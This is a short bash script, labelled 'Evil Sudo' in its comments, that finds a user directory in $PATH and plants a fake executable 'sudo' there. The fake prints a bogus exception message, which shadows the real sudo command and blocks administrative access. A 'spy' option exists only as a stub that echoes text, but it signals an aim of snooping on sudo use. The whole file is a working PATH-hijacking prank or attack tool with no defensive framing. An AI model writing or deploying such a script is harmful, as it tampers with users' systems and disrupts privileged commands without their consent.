#!/usr/bin/env bash

USER_DIRECTORY_IN_PATH=""
FAKE_ERROR_MESSAGE="10d20d7815 EXCEPTION unknown \(0313\)"

# Get the first local directory in the path
set_user_directory_in_path() {
    IFS=:
    for section in $PATH; do
        if [[ $section == *$USER* ]]; then
            USER_DIRECTORY_IN_PATH=$section
            break
        fi
    done
}

exit_if_no_user_directory_in_path() {
    if [ -z "$USER_DIRECTORY_IN_PATH" ]; then
        echo "Error: No user directory found in \$PATH."
        exit 1
    fi
}

frustrate() {
    exec 3<>$USER_DIRECTORY_IN_PATH/sudo

    echo "# Evil Sudo" >&3
    echo "sleep 1" >&3
    echo "echo $FAKE_ERROR_MESSAGE" >&3

    exec 3>&-

    chmod +x $USER_DIRECTORY_IN_PATH/sudo

    echo 😤
}

spy() {
    echo spying
}

clean() {
    exec 3<>$USER_DIRECTORY_IN_PATH/sudo

    echo "# Evil Sudo" >&3
    echo "echo $FAKE_ERROR_MESSAGE" >&3

    exec 3>&-

    chmod +x $USER_DIRECTORY_IN_PATH/sudo
}

set_user_directory_in_path
exit_if_no_user_directory_in_path

# Execute the correct variation
for arg in "$@"; do
    if [ "$arg" == "--frustrate" ] || [ "$arg" == "-f" ]; then
        frustrate
    elif [ "$arg" == '--spy' ] || [ "$arg" == "-s" ]; then
        echo spy
    elif [ "$arg" == '--clean' ] || [ "$arg" == "-c" ]; then
        echo spy
    else
        echo something went wrong
        exit
    fi
done
